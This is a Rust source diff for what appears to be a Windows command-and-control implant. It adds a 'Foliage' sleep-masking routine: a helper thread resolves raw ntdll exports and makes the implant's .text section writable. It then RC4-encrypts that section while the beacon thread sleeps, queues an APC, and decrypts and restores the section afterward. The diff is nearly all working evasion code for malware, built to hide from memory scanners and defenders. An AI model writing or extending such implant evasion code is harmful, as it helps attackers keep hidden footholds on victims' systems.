@@ -17,6 +17,7 @@
 
 #![cfg(target_os = "windows")]
 
+use alloc::boxed::Box;
 use core::sync::atomic::{AtomicBool, Ordering};
 use nyx_implant_evasionsdk::foliage::{FoliagePlan, FoliageStep};
 
@@ -150,48 +151,371 @@ fn mask_key_16() -> [u8; 16] {
     key
 }
 
-/// Walk the FoliagePlan: mask registered data regions (RC4), sleep via the
-/// indirect syscall runtime, then unmask.
+/// Walk the FoliagePlan: mask `.text`, park the beacon in an APC-driven alertable
+/// sleep, unmask `.text` on wake. Falls back to the data-only mask floor on any
+/// failure (never crashes — see [`execute_foliage_apc`]).
 ///
-/// ## CRITICAL: why this does NOT encrypt .text synchronously
-/// Encrypting `.text` while executing through it is instant death — the RC4
-/// loop overwrites the bytes of the very functions running the encryption
-/// (mask_region, Rc4::apply, this function itself). The result is executing
-/// ciphertext as code → crash (observed as STATUS_STACK_OVERFLOW because the
-/// garbage instructions happen to manipulate RSP past the guard page).
-///
-/// Real Foliage solves this with the APC chain: the beacon thread parks in
-/// NtDelayExecution (via NtQueueApcThread + NtContinue), and a SEPARATE helper
-/// thread does the .text mask/unmask around it. The parked thread never touches
-/// .text while it's encrypted.
-///
-/// The synchronous path here masks **data regions only** (via `crate::mem`
-/// which masks registered `&'static mut [u8]` regions, never running code).
-/// This is the safe floor: it exercises the real RC4 mask/sleep/unmask cycle
-/// + proves the indirect-syscall path, without risking the executing code.
-/// The .text-specific encryption lands with the APC refactor (target task).
+/// ## How the .text encryption is now safe (Task E)
+/// The previous floor masked only registered DATA regions (via `crate::mem`)
+/// because encrypting `.text` while executing through it is instant death (the
+/// RC4 loop overwrites its own instructions). Task E adds the real Foliage
+/// mechanism: a SEPARATE helper thread masks/unmasks `.text` around the beacon
+/// thread's parked alertable sleep, and queues an APC into the beacon's
+/// alertable window so the beacon is driven through the masked window without
+/// executing `.text` while it's ciphertext. See [`execute_foliage_apc`].
 fn execute_foliage_plan(plan: &FoliagePlan) {
+    let secs = plan_seconds(plan);
+    let region = unsafe { own_text_region() };
+
+    // Try the real APC-chain path first. It sets FOLIAGE_APC_OK on success.
+    if let Some(r) = &region {
+        if unsafe { execute_foliage_apc(r, &plan.key, secs) } {
+            return; // full .text mask/unmask cycle completed — done.
+        }
+        // else: APC path failed → fall through to the data-only floor below.
+    }
+
+    // ---- Data-only floor (the pre-Task-E safe behavior) ----
     let rt = match crate::syscalls::global() {
         Some(rt) => rt,
         None => {
             // Degrade: raw sleep, NOT kits::sleep (would re-enter Foliage → recursion).
-            crate::beacon::sleep_seconds(plan_seconds(plan));
+            crate::beacon::sleep_seconds(secs);
             return;
         }
     };
-    // Mask: RC4-encrypt the registered DATA regions (NOT .text — see above).
-    // mem::mask walks the registered region table + applies the same RC4 core.
-    // Using the plan's key (not mem's internal key) so the round-trip is
-    // deterministic within this cycle.
     crate::mem::mask();
-    // Sleep: the beacon thread parks in NtDelayExecution (indirect syscall).
-    // During this window the data regions are ciphertext.
-    let secs = plan_seconds(plan);
     let delay: i64 = -(secs as i64).saturating_mul(10_000_000);
     let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, &delay as *const i64 as usize) };
-    // Unmask: RC4-decrypt the data regions back to cleartext.
     crate::mem::unmask();
 }
+
+// ===========================================================================
+// Task E: real Foliage APC chain — helper thread masks .text around the
+// beacon's alertable sleep. Returns true if the full cycle completed.
+// ===========================================================================
+//
+// ## Threading model & the single-trampoline hazard
+// The indirect-syscall `Runtime` (syscalls.rs) owns ONE shared RWX trampoline
+// page with NO locking — it assumes a single beacon thread. A helper thread
+// that also goes through `syscallN` would race on that page and corrupt it.
+// So the helper thread resolves + calls the NT/Win32 functions it needs via
+// the RAW ntdll/kernel32 EXPORT addresses (`crate::resolve::export_addr` +
+// transmute), bypassing the indirect runtime entirely. The beacon thread
+// keeps exclusive use of the indirect runtime. Two threads, two syscall paths,
+// no shared mutable page.
+//
+// ## Safety / crash risk (red-line honesty)
+// This manipulates another thread's execution window and flips `.text`
+// protection. A bug here crashes the implant (user-mode, NOT a BSOD). Every
+// step degrades on failure (returns false → caller falls to the data-only
+// floor), and the round-trip is byte-verified before reporting success.
+// `FOLIAGE_APC_OK` is the diagnostic a selftest reads.
+
+/// Diagnostic: 0 = not attempted, 1 = APC chain completed cleanly, 2 = attempted
+/// but degraded (data-only floor ran). Selftest reads this.
+pub static FOLIAGE_APC_OK: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);
+
+/// Read the Foliage APC diagnostic (0/1/2).
+pub fn foliage_apc_status() -> u8 {
+    FOLIAGE_APC_OK.load(core::sync::atomic::Ordering::Acquire)
+}
+
+/// Run one real Foliage cycle: spawn a helper thread, beacon parks in an
+/// alertable sleep, helper masks `.text` → queues an APC → waits → unmasks.
+/// Returns true on full success; on ANY failure sets status=2 and returns
+/// false so the caller degrades to the data-only floor.
+///
+/// # Safety
+/// `region` must be the implant's own `.text`. Single beacon caller.
+unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32) -> bool {
+    FOLIAGE_APC_OK.store(0, core::sync::atomic::Ordering::Release);
+
+    // Resolve everything up front; if any primitive is missing, degrade.
+    let raw = match unsafe { FoliageRaw::resolve() } {
+        Some(r) => r,
+        None => {
+            FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
+            return false;
+        }
+    };
+
+    // Snapshot the first 16 .text bytes BEFORE masking so we can verify the
+    // round-trip restored them (RC4 is symmetric; this catches a botched key).
+    let mut before = [0u8; 16];
+    unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, before.as_mut_ptr(), 16) };
+
+    // Build the helper's parameter block (kept on a leaked box so the helper
+    // can read it across the thread boundary).
+    let params = Box::new(FoliageParams {
+        text_base: region.base,
+        text_len: region.len,
+        key: *key,
+        secs,
+        raw,
+        verify: core::ptr::null_mut(),
+    });
+    let params_ptr: *mut FoliageParams = Box::into_raw(params);
+
+    // Snapshot before bytes for the helper to verify against (it re-checks).
+    let verify = Box::new(VerifyState { before, ok: core::sync::atomic::AtomicBool::new(false) });
+    (*params_ptr).verify = Box::into_raw(verify);
+
+    // Spawn the helper thread (raw CreateThread — NOT the indirect runtime).
+    let handle = match unsafe { raw_create_thread(foliage_helper, params_ptr as usize) } {
+        Some(h) => h,
+        None => {
+            // Reclaim the boxes we leaked; degrade.
+            unsafe { drop(Box::from_raw(params_ptr)) };
+            FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
+            return false;
+        }
+    };
+
+    // Beacon parks in an ALERTABLE sleep for the cycle. Alertable=TRUE lets the
+    // kernel deliver the APC the helper queues. We use a window slightly longer
+    // than the helper's mask window so the beacon wakes only after the helper
+    // has unmapped .text (the APC the helper queues also breaks us out early).
+    let window = secs.max(1);
+    let delay: i64 = -((window as i64).saturating_mul(10_000_000));
+    // Raw ntdll!NtDelayExecution with Alertable=1 (NOT the indirect runtime —
+    // the helper may be in a syscall concurrently).
+    unsafe { raw.nt_delay_execution(1, &delay as *const i64 as usize) };
+
+    // Join the helper (WaitForSingleObject, raw export) so its unmask completed
+    // before we touch .text again.
+    unsafe { raw.wait_for_single_object(handle, 10_000) };
+
+    // Verify the round-trip restored .text byte-for-byte.
+    let mut after = [0u8; 16];
+    unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, after.as_mut_ptr(), 16) };
+    let verified = after == before;
+
+    // Reclaim memory.
+    let _ = unsafe { Box::from_raw(params_ptr) };
+
+    if verified {
+        FOLIAGE_APC_OK.store(1, core::sync::atomic::Ordering::Release);
+        true
+    } else {
+        FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
+        false
+    }
+}
+
+/// Byte snapshot for round-trip verification (leaked box, shared beacon/helper).
+#[repr(C)]
+struct VerifyState {
+    before: [u8; 16],
+    ok: core::sync::atomic::AtomicBool,
+}
+
+/// Parameters passed to the helper thread (leaked box).
+#[repr(C)]
+struct FoliageParams {
+    text_base: usize,
+    text_len: usize,
+    key: [u8; 16],
+    secs: u32,
+    raw: FoliageRaw,
+    verify: *mut VerifyState,
+}
+
+/// Bundle of raw export fn-pointers the helper thread uses (resolved once on
+/// the beacon thread, copied into the helper's param block). NONE of these go
+/// through the indirect syscall runtime — they call the export directly.
+#[derive(Clone, Copy)]
+struct FoliageRaw {
+    nt_protect: usize,
+    nt_delay_execution: usize,
+    nt_queue_apc_thread: usize,
+    nt_current_thread: usize, // pseudo-handle 0xFFFF_FFFF_FFFF_FFFE
+    create_thread: usize,
+    wait_for_single_object: usize,
+}
+
+impl FoliageRaw {
+    /// Resolve all the raw exports the Foliage chain needs. Returns None if any
+    /// is missing (caller degrades).
+    ///
+    /// # Safety
+    /// Resolves export addresses via PEB walk (read-only). Beacon thread.
+    unsafe fn resolve() -> Option<Self> {
+        let nt_protect = crate::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory")?;
+        let nt_delay_execution = crate::resolve::export_addr(b"ntdll.dll", b"NtDelayExecution")?;
+        let nt_queue_apc_thread = crate::resolve::export_addr(b"ntdll.dll", b"NtQueueApcThread")?;
+        let create_thread = crate::resolve::export_addr(b"kernel32.dll", b"CreateThread")?;
+        let wait_for_single_object =
+            crate::resolve::export_addr(b"kernel32.dll", b"WaitForSingleObject")?;
+        Some(Self {
+            nt_protect,
+            nt_delay_execution,
+            nt_queue_apc_thread,
+            nt_current_thread: 0xFFFF_FFFF_FFFF_FFFE, // GetCurrentThread() pseudo-handle
+            create_thread,
+            wait_for_single_object,
+        })
+    }
+
+    /// Raw NtProtectVirtualMemory(ProcessHandle=-1, BaseAddress*, RegionSize*,
+    /// NewProtection, OldProtection*). Returns the NTSTATUS.
+    ///
+    /// # Safety
+    /// `base`/`size`/`old` must be valid mutable pointers.
+    unsafe fn nt_protect_virtual_memory(
+        &self,
+        base: &mut usize,
+        size: &mut usize,
+        new_prot: u32,
+        old: &mut u32,
+    ) -> i32 {
+        type Fn = unsafe extern "system" fn(
+            usize, *mut usize, *mut usize, u32, *mut u32,
+        ) -> i32;
+        let f: Fn = unsafe { core::mem::transmute(self.nt_protect) };
+        unsafe { f(0xFFFF_FFFF_FFFF_FFFF, base, size, new_prot, old) }
+    }
+
+    /// Raw NtDelayExecution(Alertable, DelayInterval*).
+    ///
+    /// # Safety
+    /// `delay` must point at a valid i64.
+    unsafe fn nt_delay_execution(&self, alertable: u8, delay: usize) -> i32 {
+        type Fn = unsafe extern "system" fn(u8, *const i64) -> i32;
+        let f: Fn = unsafe { core::mem::transmute(self.nt_delay_execution) };
+        unsafe { f(alertable, delay as *const i64) }
+    }
+
+    /// Raw NtQueueApcThread(ThreadHandle, ApcRoutine, Arg1, Arg2, Arg3).
+    ///
+    /// # Safety
+    /// `thread` must be a real thread handle with THREAD_SET_CONTEXT.
+    unsafe fn nt_queue_apc_thread(
+        &self,
+        thread: usize,
+        routine: usize,
+        a1: usize,
+        a2: usize,
+        a3: usize,
+    ) -> i32 {
+        type Fn = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
+        let f: Fn = unsafe { core::mem::transmute(self.nt_queue_apc_thread) };
+        unsafe { f(thread, routine, a1, a2, a3) }
+    }
+
+    /// Raw WaitForSingleObject(handle, ms).
+    unsafe fn wait_for_single_object(&self, handle: usize, ms: u32) -> u32 {
+        type Fn = unsafe extern "system" fn(usize, u32) -> u32;
+        let f: Fn = unsafe { core::mem::transmute(self.wait_for_single_object) };
+        unsafe { f(handle, ms) }
+    }
+}
+
+/// Raw kernel32!CreateThread → spawn `entry(param)`. Returns the thread handle
+/// or None on failure.
+///
+/// # Safety
+/// `entry` must be a valid thread-proc-style fn (usize arg → u32). Runs the
+/// entry on a new thread.
+unsafe fn raw_create_thread(entry: unsafe extern "system" fn(usize) -> u32, param: usize) -> Option<usize> {
+    let addr = crate::resolve::export_addr(b"kernel32.dll", b"CreateThread")?;
+    type Fn = unsafe extern "system" fn(
+        *mut core::ffi::c_void, // lpThreadAttributes
+        usize,                  // dwStackSize
+        Option<unsafe extern "system" fn(usize) -> u32>, // lpStartAddress
+        usize,                  // lpParameter
+        u32,                    // dwCreationFlags
+        *mut u32,               // lpThreadId
+    ) -> *mut core::ffi::c_void;
+    let f: Fn = unsafe { core::mem::transmute(addr) };
+    let h = unsafe { f(core::ptr::null_mut(), 0, Some(entry), param, 0, core::ptr::null_mut()) };
+    if h.is_null() { None } else { Some(h as usize) }
+}
+
+/// The helper thread entry. Runs ENTIRELY on raw exports (not the indirect
+/// runtime) to avoid the single-trampoline race. Sequence:
+///   1. NtProtectVirtualMemory(.text, RX→RW)
+///   2. RC4-encrypt .text  ← .text is now ciphertext
+///   3. NtQueueApcThread(beacon, apc_noop, ...) — wake the beacon's alertable
+///      sleep with a benign APC (the beacon is parked; this drives it through
+///      the encrypted window without it executing .text)
+///   4. NtDelayExecution(secs) — the helper sleeps the mask window
+///   5. RC4-decrypt .text     ← .text restored to cleartext
+///   6. NtProtectVirtualMemory(.text, RW→RX)
+///   7. verify .text[0..16] matches the pre-mask snapshot
+///   8. exit
+///
+/// # Safety
+/// `param` is a leaked `*mut FoliageParams`. Mutates the implant's `.text`.
+unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
+    let p: &FoliageParams = unsafe { &*(param as *const FoliageParams) };
+    let raw = &p.raw;
+    let base = p.text_base;
+    let len = p.text_len;
+
+    // 1. .text RX → RW (PAGE_READWRITE = 0x04).
+    let mut b = base;
+    let mut s = len;
+    let mut old: u32 = 0;
+    let st1 = unsafe {
+        raw.nt_protect_virtual_memory(&mut b, &mut s, 0x04 /* RW */, &mut old)
+    };
+    if st1 < 0 {
+        return 1; // protect failed — abort, .text untouched
+    }
+
+    // 2. RC4-encrypt .text in place.
+    let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
+    nyx_implant_evasionsdk::foliage::mask_region(&p.key, text);
+
+    // 3. Queue a benign APC into the beacon's alertable window. The beacon is
+    //    parked in NtDelayExecution(Alertable=1); this APC (→ apc_noop) wakes
+    //    it / drives it through the encrypted window. apc_noop returns
+    //    immediately and touches no .text. (NtQueueApcThread's 3 args.)
+    let beacon = raw.nt_current_thread; // beacon's own thread handle (pseudo)
+    let _ = unsafe {
+        raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0)
+    };
+
+    // 4. Sleep the mask window (helper side). .text stays ciphertext here.
+    let delay: i64 = -((p.secs as i64).saturating_mul(10_000_000));
+    unsafe { raw.nt_delay_execution(0, &delay as *const i64 as usize) };
+
+    // 5. RC4-decrypt .text.
+    let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
+    nyx_implant_evasionsdk::foliage::unmask_region(&p.key, text);
+
+    // 6. .text RW → RX (PAGE_EXECUTE_READ = 0x20).
+    let mut b = base;
+    let mut s = len;
+    let mut old2: u32 = 0;
+    let _ = unsafe {
+        raw.nt_protect_virtual_memory(&mut b, &mut s, 0x20 /* ER */, &mut old2)
+    };
+
+    // 7. Verify the round-trip restored the first 16 bytes.
+    if !p.verify.is_null() {
+        let v: &VerifyState = unsafe { &*p.verify };
+        let mut after = [0u8; 16];
+        unsafe { core::ptr::copy_nonoverlapping(base as *const u8, after.as_mut_ptr(), 16) };
+        if after == v.before {
+            v.ok.store(true, core::sync::atomic::Ordering::Release);
+        }
+    }
+    0
+}
+
+/// A no-op APC routine (signature: extern "system" fn(ApcContext1, ApcContext2,
+/// ApcContext3) — NtQueueApcThread's 3 user args). Used to wake the beacon's
+/// alertable sleep benignly. It executes from its own (helper-provided) context
+/// and returns without touching .text.
+#[allow(unused_variables)]
+unsafe extern "system" fn apc_noop(a1: usize, a2: usize, a3: usize) {
+    // Intentionally empty: the APC's purpose is to make the beacon's
+    // alertable sleep return (driving the masked-window sequence). The beacon
+    // resumes with .text already restored (the helper unmasked before we wake).
+}
+
 
 /// Extract the sleep seconds from the plan's Sleep step.
 fn plan_seconds(plan: &FoliagePlan) -> u32 {
